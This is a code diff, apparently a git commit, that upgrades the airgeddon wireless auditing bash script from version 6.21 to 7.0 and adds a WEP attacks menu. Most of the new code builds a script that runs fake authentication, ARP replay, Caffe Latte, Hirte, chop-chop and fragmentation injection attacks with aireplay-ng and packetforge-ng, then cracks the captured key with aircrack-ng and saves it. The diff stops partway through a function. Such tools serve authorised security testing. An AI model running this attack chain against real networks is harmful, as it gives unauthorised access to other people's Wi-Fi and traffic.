@@ -2,8 +2,8 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20170422
-#Version......: 6.21
+#Date.........: 20170505
+#Version......: 7.0
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -62,6 +62,7 @@ optional_tools_names=(
 						"unbuffer"
 						"bettercap"
 						"beef"
+						"packetforge-ng"
 					)
 
 update_tools=("curl")
@@ -95,6 +96,7 @@ declare -A possible_package_names=(
 									[${optional_tools_names[17]}]="expect / expect-dev" #unbuffer
 									[${optional_tools_names[18]}]="bettercap" #bettercap
 									[${optional_tools_names[19]}]="beef-xss / beef-project" #beef
+									[${optional_tools_names[20]}]="aircrack-ng" #packetforge-ng
 									[${update_tools[0]}]="curl" #curl
 								)
 
@@ -104,8 +106,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="6.21"
-language_strings_expected_version="6.21-1"
+airgeddon_version="7.0"
+language_strings_expected_version="7.0-1"
 standardhandshake_filename="handshake-01.cap"
 tmpdir="/tmp/"
 osversionfile_dir="/etc/"
@@ -118,6 +120,14 @@ escaped_pending_of_translation="\[PoT\]"
 standard_resolution="1024x768"
 curl_404_error="404: Not Found"
 language_strings_file="language_strings.sh"
+broadcast_mac="FF:FF:FF:FF:FF:FF"
+
+#WEP vars
+wep_data="wepdata"
+wepdir="wep/"
+wep_attack_file="ag.wep.sh"
+wep_key_handler="ag.wep_key_handler.sh"
+wep_processes_file="wep_processes"
 
 #Docker vars
 docker_based_distro="Kali"
@@ -242,6 +252,7 @@ declare evil_twin_hints=(254 258 264 269 309 328 400)
 declare evil_twin_dos_hints=(267 268)
 declare beef_hints=(408)
 declare wps_hints=(342 343 344 356 369 390)
+declare wep_hints=(431 429 428 432 433)
 
 #Charset vars
 crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
@@ -1533,6 +1544,527 @@ function ask_wps_timeout() {
 	esac
 }
 
+#Validate if selected network has the needed type of encryption
+function validate_network_encryption_type() {
+
+	debug_print
+
+	case ${1} in
+		"WPA"|"WPA2")
+			if [[ "${enc}" != "WPA" ]] && [[ "${enc}" != "WPA2" ]]; then
+				echo
+				language_strings "${language}" 137 "red"
+				language_strings "${language}" 115 "read"
+				return 1
+			fi
+		;;
+		"WEP")
+			if [ "${enc}" != "WEP" ]; then
+				echo
+				language_strings "${language}" 424 "red"
+				language_strings "${language}" 115 "read"
+				return 1
+			fi
+		;;
+	esac
+
+	return 0
+}
+
+#Execute wep all-in-one attack
+#shellcheck disable=SC2164
+function exec_wep_allinone_attack() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 296 "yellow"
+	language_strings "${language}" 115 "read"
+
+	prepare_wep_attack
+	set_wep_script
+
+	recalculate_windows_sizes
+	bash "${tmpdir}${wep_attack_file}" > /dev/null 2>&1 &
+	wep_script_pid=$!
+
+	set_wep_key_script
+	bash "${tmpdir}${wep_key_handler}" "${wep_script_pid}" > /dev/null 2>&1 &
+	wep_key_script_pid=$!
+
+	echo
+	language_strings "${language}" 434 "yellow"
+	language_strings "${language}" 115 "read"
+
+	kill_wep_windows
+}
+
+#Kill the wep attack processes
+function kill_wep_windows() {
+
+	debug_print
+
+	kill "${wep_script_pid}" &> /dev/null
+	wait $! 2>/dev/null
+
+	kill "${wep_key_script_pid}" &> /dev/null
+	wait $! 2>/dev/null
+
+	readarray -t WEP_PROCESSES_TO_KILL < <(cat < "${tmpdir}${wepdir}${wep_processes_file}" 2> /dev/null)
+	for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
+		kill "${item}" &> /dev/null
+	done
+}
+
+#Prepare wep attack deleting temp files
+function prepare_wep_attack() {
+
+	debug_print
+
+	tmpfiles_toclean=1
+
+	rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
+	rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
+}
+
+#Create here-doc bash script used for key handling on wep all-in-one attack
+function set_wep_key_script() {
+
+	debug_print
+
+	exec 8>"${tmpdir}${wep_key_handler}"
+
+	cat >&8 <<-EOF
+		#!/bin/bash
+		wep_key_found=0
+
+		#Check if the wep password was captured and manage to save it on a file
+		function manage_wep_pot() {
+
+			if [ -f "${tmpdir}${wepdir}wepkey.txt" ]; then
+				wep_hex_key_cmd="cat \"${tmpdir}${wepdir}wepkey.txt\""
+	EOF
+
+	cat >&8 <<-'EOF'
+				wep_hex_key=$(eval "${wep_hex_key_cmd}")
+				wep_ascii_key=$(echo "${wep_hex_key}" | awk 'RT{printf "%c", strtonum("0x"RT)}' RS='[0-9]{2}')
+	EOF
+
+	cat >&8 <<-EOF
+				echo "" > "${weppotenteredpath}"
+				{
+	EOF
+
+	cat >&8 <<-'EOF'
+				date +%Y-%m-%d
+	EOF
+
+	cat >&8 <<-EOF
+				echo -e "${wep_texts[${language},1]}"
+				echo ""
+				echo -e "BSSID: ${bssid}"
+				echo -e "${wep_texts[${language},2]}: ${channel}"
+				echo -e "ESSID: ${essid}"
+				echo ""
+				echo "---------------"
+				echo ""
+	EOF
+
+	cat >&8 <<-'EOF'
+				echo -e "ASCII: ${wep_ascii_key}"
+	EOF
+
+	cat >&8 <<-EOF
+				echo -en "${wep_texts[${language},3]}:"
+	EOF
+
+	cat >&8 <<-'EOF'
+				echo -en " ${wep_hex_key}"
+	EOF
+
+	cat >&8 <<-EOF
+				} >> "${weppotenteredpath}"
+			fi
+		}
+
+		#Kill the wep attack processes
+		function kill_wep_script_windows() {
+
+			readarray -t WEP_PROCESSES_TO_KILL < <(cat < "${tmpdir}${wepdir}${wep_processes_file}" 2> /dev/null)
+	EOF
+
+	cat >&8 <<-'EOF'
+			for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
+				kill "${item}" &> /dev/null
+			done
+		}
+	EOF
+
+	cat >&8 <<-EOF
+		while true; do
+			sleep 1
+			if [ -f "${tmpdir}${wepdir}wepkey.txt" ]; then
+				wep_key_found=1
+				break
+			fi
+	EOF
+
+	cat >&8 <<-'EOF'
+			wep_script_alive=$(ps uax | awk '{print $2}' | egrep "^${1}$" 2> /dev/null)
+			if [ -z "${wep_script_alive}" ]; then
+				break
+			fi
+		done
+
+		if [ "${wep_key_found}" -eq 1 ]; then
+			manage_wep_pot
+		fi
+	EOF
+
+	cat >&8 <<-EOF
+		kill_wep_script_windows
+		rm -rf "${tmpdir}${wepdir}${wep_processes_file}"
+		touch "${tmpdir}${wepdir}${wep_processes_file}"
+	EOF
+
+	cat >&8 <<-'EOF'
+		if [ "${wep_key_found}" -eq 1 ]; then
+	EOF
+
+	cat >&8 <<-EOF
+			wep_key_cmd="echo -e '\t${yellow_color}${wep_texts[${language},5]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${wep_texts[${language},6]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}'"
+			wep_key_cmd+="&& echo"
+			wep_key_cmd+="&& echo -e '\t${blue_color}${wep_texts[${language},4]}${normal_color}'"
+			wep_key_cmd+="&& echo"
+			wep_key_cmd+="&& echo -en '\t${blue_color}ASCII: ${normal_color}'"
+	EOF
+
+	cat >&8 <<-'EOF'
+			wep_key_cmd+="&& echo -en '${wep_ascii_key}'"
+	EOF
+
+	cat >&8 <<-EOF
+			wep_key_cmd+="&& echo"
+			wep_key_cmd+="&& echo -en '\t${blue_color}${wep_texts[${language},3]}: ${normal_color}'"
+	EOF
+
+	cat >&8 <<-'EOF'
+			wep_key_cmd+="&& echo -en '${wep_hex_key}'"
+	EOF
+
+	cat >&8 <<-EOF
+			wep_key_cmd+="&& echo"
+			wep_key_cmd+="&& echo"
+			wep_key_cmd+="&& echo -e '\t${pink_color}${wep_texts[${language},7]}: [${normal_color}${weppotenteredpath}${pink_color}]${normal_color}'"
+			wep_key_cmd+="&& echo"
+			wep_key_cmd+="&& echo -e '\t${yellow_color}${wep_texts[${language},8]}'"
+
+			window_position="${g5_topright_window}"
+			sleep 0.5
+	EOF
+
+	cat >&8 <<-'EOF'
+			xterm -hold -bg black -fg white -geometry "${window_position}" -T "WEP Key Decrypted" -e "eval \"${wep_key_cmd}\"" > /dev/null 2>&1 &
+			wep_key_window_pid=$!
+			{
+			echo -e "${wep_key_window_pid}"
+	EOF
+
+	cat >&8 <<-EOF
+			} >> "${tmpdir}${wepdir}${wep_processes_file}"
+		fi
+	EOF
+}
+
+#Create here-doc bash script used for wep all-in-one attack
+function set_wep_script() {
+
+	debug_print
+
+	current_mac=$(cat < "/sys/class/net/${interface}/address" 2> /dev/null)
+
+	exec 6>"${tmpdir}${wep_attack_file}"
+
+	cat >&6 <<-EOF
+		#!/bin/bash
+		#shellcheck disable=SC1037
+		#shellcheck disable=SC2164
+		#shellcheck disable=SC2140
+		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+		mkdir "${tmpdir}${wepdir}" > /dev/null 2>&1
+		cd "${tmpdir}${wepdir}" > /dev/null 2>&1
+	EOF
+
+	cat >&6 <<-'EOF'
+		#Execute wep chop-chop attack on its different phases
+		function wep_chopchop_attack() {
+
+			case ${wep_chopchop_phase} in
+				1)
+	EOF
+
+	cat >&6 <<-EOF
+					if grep "Now you can build a packet" "${tmpdir}${wepdir}chopchop_output.txt" > /dev/null 2>&1; then
+	EOF
+
+	cat >&6 <<-'EOF'
+						wep_chopchop_phase=2
+					else
+						wep_chopchop_phase1_pid_alive=$(ps uax | awk '{print $2}' | egrep "^${wep_chopchop_phase1_pid}$" 2> /dev/null)
+						if [[ ${wep_chopchop_launched} -eq 0 ]] || [ -z "${wep_chopchop_phase1_pid_alive}" ]; then
+							wep_chopchop_launched=1
+	EOF
+
+	cat >&6 <<-EOF
+							xterm -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (1/3)" -e "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+							wep_chopchop_phase1_pid=$!
+							wep_script_processes+=(${wep_chopchop_phase1_pid})
+						fi
+					fi
+				;;
+				2)
+	EOF
+
+	cat >&6 <<-EOF
+					xterm -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+					wep_chopchop_phase2_pid=$!
+					wep_script_processes+=(${wep_chopchop_phase2_pid})
+					wep_chopchop_phase=3
+				;;
+				3)
+					wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | egrep "^${wep_chopchop_phase2_pid}$" 2> /dev/null)
+					if [ -z "${wep_chopchop_phase2_pid_alive}" ]; then
+	EOF
+
+	cat >&6 <<-EOF
+						xterm -hold -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+						wep_script_processes+=($!)
+						wep_chopchop_phase=4
+					fi
+				;;
+			esac
+			write_wep_processes
+		}
+	EOF
+
+	cat >&6 <<-EOF
+		#Execute wep fragmentation attack on its different phases
+		function wep_fragmentation_attack() {
+	EOF
+
+	cat >&6 <<-'EOF'
+			case ${wep_fragmentation_phase} in
+				1)
+	EOF
+
+	cat >&6 <<-EOF
+					if grep "Now you can build a packet" "${tmpdir}${wepdir}fragmentation_output.txt" > /dev/null 2>&1; then
+	EOF
+
+	cat >&6 <<-'EOF'
+						wep_fragmentation_phase=2
+					else
+						wep_fragmentation_phase1_pid_alive=$(ps uax | awk '{print $2}' | egrep "^${wep_fragmentation_phase1_pid}$" 2> /dev/null)
+						if [[ ${wep_fragmentation_launched} -eq 0 ]] || [ -z "${wep_fragmentation_phase1_pid_alive}" ]; then
+							wep_fragmentation_launched=1
+	EOF
+
+	cat >&6 <<-EOF
+							xterm -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (1/3)" -e "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+							wep_fragmentation_phase1_pid=$!
+							wep_script_processes+=(${wep_fragmentation_phase1_pid})
+						fi
+					fi
+				;;
+				2)
+	EOF
+
+	cat >&6 <<-EOF
+					xterm -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+					wep_fragmentation_phase2_pid=$!
+					wep_script_processes+=(${wep_fragmentation_phase2_pid})
+					wep_fragmentation_phase=3
+				;;
+				3)
+					wep_fragmentation_phase2_pid_alive=$(ps uax | awk '{print $2}' | egrep "^${wep_fragmentation_phase2_pid}$" 2> /dev/null)
+					if [ -z "${wep_fragmentation_phase2_pid_alive}" ]; then
+	EOF
+
+	cat >&6 <<-EOF
+						xterm -hold -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+						wep_script_processes+=($!)
+						wep_fragmentation_phase=4
+					fi
+				;;
+			esac
+			write_wep_processes
+		}
+
+		#Write on a file the id of the WEP attack processes
+		function write_wep_processes() {
+	EOF
+
+	cat >&6 <<-EOF
+			if [ ! -f "${tmpdir}${wepdir}${wep_processes_file}" ]; then
+				touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
+			fi
+			path_to_process_file="${tmpdir}${wepdir}${wep_processes_file}"
+	EOF
+
+	cat >&6 <<-'EOF'
+			for item in "${wep_script_processes[@]}"; do
+				egrep "^${item}$" "${path_to_process_file}" > /dev/null 2>&1
+	EOF
+
+	cat >&6 <<-'EOF'
+				if [ "$?" != "0" ]; then
+					echo "${item}" >>\
+	EOF
+
+	cat >&6 <<-EOF
+					"${tmpdir}${wepdir}${wep_processes_file}"
+				fi
+			done
+		}
+
+		wep_script_processes=()
+		xterm -bg black -fg white -geometry "${g5_topright_window}" -T "Capturing WEP Data" -e "airodump-ng -d ${bssid} -c ${channel} -w \"${tmpdir}${wep_data}\" ${interface}" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+		wep_script_capture_pid=$!
+		wep_script_processes+=(${wep_script_capture_pid})
+		write_wep_processes
+	EOF
+
+	cat >&6 <<-EOF
+		wep_to_be_launched_only_once=0
+		wep_fakeauth_pid=""
+		wep_aircrack_launched=0
+		current_ivs=0
+		wep_chopchop_launched=0
+		wep_chopchop_phase=1
+		wep_fragmentation_launched=0
+		wep_fragmentation_phase=1
+	EOF
+
+	cat >&6 <<-'EOF'
+		while true; do
+			wep_capture_pid_alive=$(ps uax | awk '{print $2}' | egrep "^${wep_script_capture_pid}$" 2> /dev/null)
+			wep_fakeauth_pid_alive=$(ps uax | awk '{print $2}' | egrep "^${wep_fakeauth_pid}$" 2> /dev/null)
+
+			if [[ -n ${wep_capture_pid_alive} ]] && [[ -z ${wep_fakeauth_pid_alive} ]]; then
+	EOF
+
+	cat >&6 <<-EOF
+				xterm -bg black -fg green -geometry "${g5_left1}" -T "Fake Auth" -e "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+				wep_fakeauth_pid=$!
+				wep_script_processes+=(${wep_fakeauth_pid})
+				write_wep_processes
+				sleep 2
+			fi
+
+			if [ ${wep_to_be_launched_only_once} -eq 0 ]; then
+				wep_to_be_launched_only_once=1
+	EOF
+
+	cat >&6 <<-EOF
+				xterm -hold -bg black -fg yellow -geometry "${g5_left2}" -T "Arp Broadcast Injection" -e "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+				wep_script_processes+=($!)
+	EOF
+
+	cat >&6 <<-EOF
+				xterm -hold -bg black -fg red -geometry "${g5_left3}" -T "Arp Request Replay" -e "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+				wep_script_processes+=($!)
+	EOF
+
+	cat >&6 <<-EOF
+				xterm -hold -bg black -fg pink -geometry "${g5_left4}" -T "Caffe Latte Attack" -e "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+				wep_script_processes+=($!)
+	EOF
+
+	cat >&6 <<-EOF
+				xterm -hold -bg black -fg grey -geometry "${g5_left5}" -T "Hirte Attack" -e "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+				wep_script_processes+=($!)
+				write_wep_processes
+			fi
+
+			if [ ${wep_fragmentation_phase} -lt 4 ]; then
+				wep_fragmentation_attack
+			fi
+
+			if [ ${wep_chopchop_phase} -lt 4 ]; then
+				wep_chopchop_attack
+			fi
+	EOF
+
+	cat >&6 <<-EOF
+			ivs_cmd="grep WEP ${tmpdir}${wep_data}*.csv --exclude=*kismet* | head -n 1 "
+	EOF
+
+	cat >&6 <<-'EOF'
+			ivs_cmd+="| awk '{print \$11}' FS=',' | sed 's/ //g'"
+
+			current_ivs=$(eval "${ivs_cmd}")
+			if [[ ${current_ivs} -ge 5000 ]] && [[ ${wep_aircrack_launched} -eq 0 ]]; then
+				wep_aircrack_launched=1
+	EOF
+
+	cat >&6 <<-EOF
+				xterm -bg black -fg yellow -geometry "${g5_bottomright_window}" -T "Decrypting WEP Key" -e "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" > /dev/null 2>&1 &
+	EOF
+
+	cat >&6 <<-'EOF'
+				wep_aircrack_pid=$!
+				wep_script_processes+=(${wep_aircrack_pid})
+				write_wep_processes
+			fi
+
+			wep_aircrack_pid_alive=$(ps uax | awk '{print $2}' | egrep "^${wep_aircrack_pid}$" 2> /dev/null)
+			if [[ -z "${wep_aircrack_pid_alive}" ]] && [[ ${wep_aircrack_launched} -eq 1 ]]; then
+				break
+			elif [[ -z "${wep_capture_pid_alive}" ]]; then
+				break
+			fi
+		done
+	EOF
+}
+
 #Execute wps custom pin bully attack
 function exec_wps_custom_pin_bully_attack() {
 
@@ -1899,6 +2431,42 @@ function michael_shutdown_option() {
 	exec_michaelshutdown
 }
 
+#Validate wep all-in-one attack parameters
+function wep_option() {
+
+	debug_print
+
+	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
+		echo
+		language_strings "${language}" 125 "yellow"
+		language_strings "${language}" 115 "read"
+		explore_for_targets_option
+	fi
+
+	if [ "$?" != "0" ]; then
+		return 1
+	fi
+
+	check_monitor_enabled
+	if [ "$?" != "0" ]; then
+		return 1
+	fi
+
+	validate_network_encryption_type "WEP"
+	if [ "$?" != "0" ]; then
+		return 1
+	fi
+
+	echo
+	language_strings "${language}" 425 "yellow"
+	language_strings "${language}" 115 "read"
+
+	manage_wep_log
+	language_strings "${language}" 115 "read"
+
+	exec_wep_allinone_attack
+}
+
 #Validate wps parameters for custom pin, pixie dust, bruteforce and pin database attacks
 function wps_attacks_parameters() {
 
@@ -2140,6 +2708,7 @@ function initialize_menu_options_dependencies() {
 	bully_pixie_dust_attack_dependencies=(${optional_tools_names[15]} ${optional_tools_names[16]} ${optional_tools_names[17]})
 	reaver_pixie_dust_attack_dependencies=(${optional_tools_names[14]} ${optional_tools_names[16]})
 	et_sniffing_sslstrip2_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[18]} ${optional_tools_names[19]})
+	wep_attack_dependencies=(${optional_tools_names[2]} ${optional_tools_names[20]})
 }
 
 #Set possible changes for some commands that can be found in different ways depending of the O.S.
@@ -2226,6 +2795,10 @@ function initialize_menu_and_print_selections() {
 			print_iface_selected
 			print_all_target_vars_wps
 		;;
+		"wep_attacks_menu")
+			print_iface_selected
+			print_all_target_vars
+		;;
 		"beef_pre_menu")
 			print_iface_selected
 			print_all_target_vars_et
@@ -2260,13 +2833,17 @@ function clean_tmpfiles() {
 	fi
 	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
-	rm -rf -R "${tmpdir}${webdir}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
 	if [ "${dhcpd_path_changed}" -eq 1 ]; then
 		rm -rf "${dhcp_path}" > /dev/null 2>&1
 	fi
 	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
 	rm -rf "${tmpdir}${wps_attack_script_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
+	rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
 }
 
 #Manage cleaning firewall rules and restore orginal routing state
@@ -2393,6 +2970,13 @@ function print_hint() {
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
 			strtoprint=${hints[wps_hints|${randomhint}]}
 		;;
+		"wep_attacks_menu")
+			store_array hints wep_hints "${wep_hints[@]}"
+			hintlength=${#wep_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
+			strtoprint=${hints[wep_hints|${randomhint}]}
+		;;
 		"beef_pre_menu")
 			store_array hints beef_hints "${beef_hints[@]}"
 			hintlength=${#beef_hints[@]}
@@ -2428,6 +3012,7 @@ function main_menu() {
 	language_strings "${language}" 169
 	language_strings "${language}" 252
 	language_strings "${language}" 333
+	language_strings "${language}" 426
 	print_simple_separator
 	language_strings "${language}" 60
 	language_strings "${language}" 78
@@ -2461,12 +3046,15 @@ function main_menu() {
 			wps_attacks_menu
 		;;
 		9)
-			credits_option
+			wep_attacks_menu
 		;;
 		10)
-			language_menu
+			credits_option
 		;;
 		11)
+			language_menu
+		;;
+		12)
 			exit_script_option
 		;;
 		*)
@@ -2902,6 +3490,61 @@ function wps_attacks_menu() {
 	esac
 
 	wps_attacks_menu
+}
+
+#WEP attacks menu
+function wep_attacks_menu() {
+
+	debug_print
+
+	clear
+	language_strings "${language}" 427 "title"
+	current_menu="wep_attacks_menu"
+	initialize_menu_and_print_selections
+	echo
+	language_strings "${language}" 47 "green"
+	print_simple_separator
+	language_strings "${language}" 48
+	language_strings "${language}" 55
+	language_strings "${language}" 56
+	language_strings "${language}" 49
+	language_strings "${language}" 50 "separator"
+	language_strings "${language}" 423 wep_attack_dependencies[@]
+	print_simple_separator
+	language_strings "${language}" 174
+	print_hint ${current_menu}
+
+	read -r wep_option
+	case ${wep_option} in
+		1)
+			select_interface
+		;;
+		2)
+			monitor_option
+		;;
+		3)
+			managed_option
+		;;
+		4)
+			explore_for_targets_option
+		;;
+		5)
+			contains_element "${wep_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				wep_option
+			fi
+		;;
+		6)
+			return
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	wep_attacks_menu
 }
 
 #Offline decryption attacks menu
@@ -3432,6 +4075,25 @@ function manage_bettercap_log() {
 			read_path "bettercaplog"
 		done
 	fi
+}
+
+#Check if the password was captured using wep all-in-one attack and manage to save it on a file
+function manage_wep_log() {
+
+	debug_print
+
+	wep_potpath=$(env | grep ^HOME | awk -F = '{print $2}')
+	lastcharwep_potpath=${wep_potpath: -1}
+	if [ "${lastcharwep_potpath}" != "/" ]; then
+		wep_potpath="${wep_potpath}/"
+	fi
+	weppot_filename="wep_captured_key-${essid}.txt"
+	wep_potpath="${wep_potpath}${weppot_filename}"
+
+	validpath=1
+	while [[ "${validpath}" != "0" ]]; do
+		read_path "weppot"
+	done
 }
 
 #Check if the passwords were captured using the captive portal Evil Twin attack and manage to save them on a file
@@ -4804,7 +5466,7 @@ function set_captive_portal_page() {
 
 	debug_print
 
-	rm -rf -R "${tmpdir}${webdir}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
 	mkdir "${tmpdir}${webdir}" > /dev/null 2>&1
 
 	{
@@ -5697,10 +6359,8 @@ function capture_handshake_evil_twin() {
 
 	debug_print
 
-	if [[ ${enc} != "WPA" ]] && [[ ${enc} != "WPA2" ]]; then
-		echo
-		language_strings "${language}" 137 "red"
-		language_strings "${language}" 115 "read"
+	validate_network_encryption_type "WPA"
+	if [ "$?" != "0" ]; then
 		return 1
 	fi
 
@@ -5778,10 +6438,13 @@ function capture_handshake() {
 		return 1
 	fi
 
-	if [[ ${enc} != "WPA" ]] && [[ ${enc} != "WPA2" ]]; then
-		echo
-		language_strings "${language}" 137 "red"
-		language_strings "${language}" 115 "read"
+	check_monitor_enabled
+	if [ "$?" != "0" ]; then
+		return 1
+	fi
+
+	validate_network_encryption_type "WPA"
+	if [ "$?" != "0" ]; then
 		return 1
 	fi
 
@@ -5850,6 +6513,10 @@ function validate_path() {
 			"writeethandshake")
 				et_handshake="${pathname}${standardhandshake_filename}"
 				suggested_filename="${standardhandshake_filename}"
+			;;
+			"weppot")
+				suggested_filename="${weppot_filename}"
+				weppotenteredpath+="${weppot_filename}"
 			;;
 		esac
 
@@ -5968,6 +6635,14 @@ function read_path() {
 				et_captive_portal_logpath="${default_et_captive_portal_logpath}"
 			fi
 			validate_path "${et_captive_portal_logpath}" "${1}"
+		;;
+		"weppot")
+			language_strings "${language}" 430 "blue"
+			read_and_clean_path "weppotenteredpath"
+			if [ -z "${weppotenteredpath}" ]; then
+				weppotenteredpath="${wep_potpath}"
+			fi
+			validate_path "${weppotenteredpath}" "${1}"
 		;;
 	esac
 
@@ -8034,17 +8709,27 @@ function set_windows_sizes() {
 	g2_stdright_window="${xwindow}x${ywindowone}-0+0"
 
 	g3_topleft_window="${xwindow}x${ywindowthird}+0+0"
-	g3_middleleft_window="${xwindow}x${ywindowthird}+0+${middle_position}"
+	g3_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
 	g3_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
 	g3_topright_window="${xwindow}x${ywindowhalf}-0+0"
 	g3_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
 
 	g4_topleft_window="${xwindow}x${ywindowthird}+0+0"
-	g4_middleleft_window="${xwindow}x${ywindowthird}+0+${middle_position}"
+	g4_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
 	g4_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
 	g4_topright_window="${xwindow}x${ywindowthird}-0+0"
-	g4_middleright_window="${xwindow}x${ywindowthird}-0+${middle_position}"
+	g4_middleright_window="${xwindow}x${ywindowthird}-0+${second_of_three_position}"
 	g4_bottomright_window="${xwindow}x${ywindowthird}-0-0"
+
+	g5_left1="${xwindow}x${ywindowseventh}+0+0"
+	g5_left2="${xwindow}x${ywindowseventh}+0+${second_of_seven_position}"
+	g5_left3="${xwindow}x${ywindowseventh}+0+${third_of_seven_position}"
+	g5_left4="${xwindow}x${ywindowseventh}+0+${fourth_of_seven_position}"
+	g5_left5="${xwindow}x${ywindowseventh}+0+${fifth_of_seven_position}"
+	g5_left6="${xwindow}x${ywindowseventh}+0+${sixth_of_seven_position}"
+	g5_left7="${xwindow}x${ywindowseventh}+0+${seventh_of_seven_position}"
+	g5_topright_window="${xwindow}x${ywindowhalf}-0+0"
+	g5_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
 }
 
 #Set sizes for x axis
@@ -8086,6 +8771,7 @@ function set_ysizes() {
 	ywindowone=$((ytotal - ywindow_edge_lines))
 	ywindowhalf=$((ytotal / 2 - ywindow_edge_lines))
 	ywindowthird=$((ytotal / 3 - ywindow_edge_lines))
+	ywindowseventh=$((ytotal / 7 - ywindow_edge_lines))
 }
 
 #Set positions for y axis
@@ -8093,7 +8779,14 @@ function set_ypositions() {
 
 	debug_print
 
-	middle_position=$((resolution_y / 3 + ywindow_edge_pixels))
+	second_of_three_position=$((resolution_y / 3 + ywindow_edge_pixels))
+
+	second_of_seven_position=$((resolution_y / 7 + ywindow_edge_pixels))
+	third_of_seven_position=$((resolution_y / 7 + resolution_y / 7 + ywindow_edge_pixels))
+	fourth_of_seven_position=$((resolution_y / 7 + 2 * (resolution_y / 7) + ywindow_edge_pixels))
+	fifth_of_seven_position=$((resolution_y / 7 + 3 * (resolution_y / 7) + ywindow_edge_pixels))
